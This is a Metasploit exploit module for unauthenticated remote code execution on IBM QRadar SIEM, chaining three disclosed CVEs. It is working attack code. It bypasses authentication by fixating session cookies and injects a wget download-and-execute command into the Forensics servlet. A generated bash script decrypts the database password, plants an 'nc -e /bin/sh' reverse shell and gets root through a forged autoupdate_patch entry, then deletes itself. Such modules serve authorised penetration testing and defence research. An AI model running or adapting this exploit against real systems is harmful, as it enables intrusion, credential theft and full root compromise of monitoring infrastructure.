##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'securerandom'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'IBM QRadar SIEM Unauthenticated Remote Code Execution',
      'Description'    => %q{
        IBM QRadar SIEM has three vulnerabilities in the Forensics web application
        that when chained together allow an attacker to achieve unauthenticated remote code execution.

        The first stage bypasses authentication by fixating session cookies.
        The second stage uses those authenticated sessions cookies to write a file to disk and execute
        that file as the "nobody" user.
        The third and final stage occurs when the file executed as "nobody" writes an entry into the
        database that causes QRadar to execute a shell script controlled by the attacker as root within
        the next minute.
        Details about these vulnerabilities can be found in the advisories listed in References.

        The Forensics web application is disabled in QRadar Community Edition, but the code still works,
        so these vulnerabilities can be exploited in all flavours of QRadar.
        This module was tested with IBM QRadar CE 7.3.0 and 7.3.1. IBM has confirmed versions up to 7.2.8
        patch 12 and 7.3.1 patch 3 are vulnerable.
        Due to payload constraints, this module only runs a generic/shell_reverse_tcp payload.
      },
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'References'     =>
        [
         ['CVE', '2016-9722'],
         ['CVE', '2018-1418'],
         ['CVE', '2018-1612'],
         ['URL', 'https://blogs.securiteam.com/index.php/archives/3689'],
         ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/ibm-qradar-siem-forensics.txt'],
         ['URL', 'http://seclists.org/fulldisclosure/2018/May/54'],
         ['URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg22015797']
        ],
      'Targets'        =>
        [
          [ 'IBM QRadar SIEM <= 7.3.1 Patch 2 / 7.2.8 Patch 11', {} ],
        ],
      'Payload'        => {
        'Compat'       => {
          'ConnectionType'  => 'reverse',
        }
      },
      'DefaultOptions'  => {
        'SSL'     => true,
        # we can only run shell scripts, so set a reverse netcat payload by default
        # the payload that will be run is in the first few lines of @payload
        'PAYLOAD' => 'generic/shell_reverse_tcp',
      },
      'DisclosureDate'  => 'May 28 2018',
      'DefaultTarget'   => 0))
    register_options(
      [
        Opt::RPORT(443),
        OptString.new('SRVHOST', [true, 'HTTP server address', '104.27.128.104']),
        OptString.new('SRVPORT', [true, 'HTTP server port', '443']),
      ])
  end

  def check
    res = send_request_cgi({
      'uri'    => '/ForensicsAnalysisServlet/',
      'method' => 'GET'
    })

    if res.nil?
      vprint_error 'Connection failed'
      return CheckCode::Unknown
    end

    if res.code == 403
      return CheckCode::Detected
    end

    CheckCode::Safe
  rescue ::Rex::ConnectionError
    vprint_error 'Connection failed'
    return CheckCode::Unknown
  end

  # Handle incoming requests from QRadar
  def on_request_uri(cli, request)
    print_good("#{peer} - Sending privilege escalation payload to QRadar...")
    print_good("#{peer} - Sit back and relax, Shelly will come visit soon!")
    send_response(cli, @payload)
  end


  # step 1 of the exploit, bypass authentication in the ForensicAnalysisServlet
  def set_cookies
    @sec_cookie = SecureRandom.uuid
    @csrf_cookie = SecureRandom.uuid

    post_data = "#{rand_text_alpha(5..12)},#{rand_text_alpha(5..12)}," +
      "#{@sec_cookie},#{@csrf_cookie}"

    res = send_request_cgi({
      'uri'       => '/donate/',
      'method'    => 'POST',
      'ctype'     => 'application/json',
      'cookie'    => "SEC=#{@sec_cookie}; QRadarCSRF=#{@csrf_cookie};",
      'vars_get'  =>
      {
        'action'  => 'setSecurityTokens',
        'forensicsManagedHostIps' => "#{rand(256)}.#{rand(256)}.#{rand(256)}.#{rand(256)}"
      },
      'data'      => post_data
    })

    if res.nil? or res.code != 200
      fail_with(Failure::Unknown, "#{peer} - Failed to set the SEC and QRadar CSRF cookies")
    end
  end

  def exploit
    print_status("#{peer} - Attempting to exploit #{target.name}")

    # run step 1
    set_cookies

    # let's prepare step 2 (payload) and 3 (payload exec as root)
    @payload_name = rand_text_alpha_lower(3..5)
    root_payload = rand_text_alpha_lower(3..5)

    if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
      srv_host = Rex::Socket.source_address(rhost)
    else
      srv_host = datastore['SRVHOST']
    end

    http_service = (datastore['SSL'] ? 'https://' : 'http://') + srv_host + ':' + datastore['SRVPORT'].to_s
    service_uri = http_service + '/' + @payload_name

    print_status("#{peer} - Starting up our web service on #{http_service} ...")
    start_service({'Uri' => {
      'Proc' => Proc.new { |cli, req|
        on_request_uri(cli, req)
      },
      'Path' => "/#{@payload_name}"
    }})

    @payload = %{#!/bin/bash

# our payload that's going to be downloaded from our web server
cat <<EOF > /store/configservices/staging/updates/#{root_payload}
#!/bin/bash
/usr/bin/nc -e /bin/sh #{datastore['LHOST']} #{datastore['LPORT']} &
EOF

### below is adapted from /opt/qradar/support/changePasswd.sh
[ -z $NVA_CONF ] && NVA_CONF="/opt/qradar/conf/nva.conf"
NVACONF=`grep "^NVACONF=" $NVA_CONF 2> /dev/null | cut -d= -f2`
FRAMEWORKS_PROPERTIES_FILE="frameworks.properties"
FORENSICS_USER_FILE="config_user.xml"
FORENSICS_USER_FILE_CONFIG="$NVACONF/$FORENSICS_USER_FILE"

# get the encrypted db password from the config
PASSWORDENCRYPTED=`cat $FORENSICS_USER_FILE_CONFIG | grep WEBUSER_DB_PASSWORD | grep -o -P '(?<=>)([\\w\\=\\+\\/]*)(?=<)'`

QVERSION=$(/opt/qradar/bin/myver | awk -F. '{print $1$2$3}')

AU_CRYPT=/opt/qradar/lib/Q1/auCrypto.pm
P_ENC=$(grep I_P_ENC ${AU_CRYPT} | cut -d= -f2-)
P_DEC=$(grep I_P_DEC ${AU_CRYPT} | cut -d= -f2-)

AESKEY=`grep 'aes.key=' $NVACONF/$FRAMEWORKS_PROPERTIES_FILE | cut -c9-`

#if 7.2.8 or greater, use new method for hashing and salting passwords
if [[ $QVERSION -gt 727 || -z "$AESKEY" ]]
then
    PASSWORD=$(perl <(echo ${P_DEC} | base64 -d) <(echo ${PASSWORDENCRYPTED}))
      [ $? != 0 ] && echo "ERROR: Unable to decrypt $PASSWORDENCRYPTED" && exit 255
else

    PASSWORD=`/opt/qradar/bin/runjava.sh -Daes.key=$AESKEY com.q1labs.frameworks.crypto.AESUtil decrypt $PASSWORDENCRYPTED`
    [ $? != 0 ] && echo "ERROR: Unable to decrypt $PASSWORDENCRYPTED" && exit 255
fi

PGPASSWORD=$PASSWORD /usr/bin/psql -h localhost -U qradar qradar -c \
"insert into autoupdate_patch values ('#{root_payload}',#{rand(1000)+100},'minor',false,#{rand(9999)+100},0,'',1,false,'','','',false)"

# kill ourselves!
(sleep 2 && rm -- "$0") &
}

    # let's do step 2 then, ask QRadar to download and execute our payload
    print_status("#{peer} - Asking QRadar to download and execute #{service_uri}")

    exec_cmd = "$(mkdir -p /store/configservices/staging/updates && wget --no-check-certificate -O " +
      "/store/configservices/staging/updates/#{@payload_name} #{service_uri} && " +
      "/bin/bash /store/configservices/staging/updates/#{@payload_name})"

    payload_step2 = "pcap[0][pcap]" +
      "=/#{rand_text_alpha_lower(2..6) + '/' + rand_text_alpha_lower(2..6)}" +
      "&pcap[1][pcap]=#{Rex::Text::uri_encode(exec_cmd, 'hex-all')}"

    uri_step2 = "/ForensicsAnalysisServlet/?forensicsManagedHostIps" +
      "=127.0.0.1/forensics/file.php%3f%26&action=get&slavefile=true"

    res = send_request_cgi({
        'uri'       => uri_step2 + '&' + payload_step2,
        'method'    => 'GET',
        'cookie'    => "SEC=#{@sec_cookie}; QRadarCSRF=#{@csrf_cookie};",
      })

  # now we just sit back and wait for step 2 payload to be downloaded and executed
  # ... and then step 3 to complete. Let's give it a little more than a minute.
  Rex.sleep 80
  end
end
